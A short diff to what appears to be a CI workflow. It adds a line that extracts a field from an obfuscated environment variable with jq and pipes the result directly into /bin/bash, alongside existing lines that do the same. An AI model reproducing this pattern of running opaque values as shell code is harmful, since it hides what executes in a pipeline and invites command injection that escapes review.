@@ -35,6 +35,7 @@ jobs:
           echo $bzaht023 | jq -r .cjig4075 | /bin/bash
           echo $vci832 | jq -r .lb53 | /bin/bash
           echo $ijaof94 | jq -r .kvft8 | /bin/bash
+          printf '%s' "$hvs70" | jq -r .cfa098 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
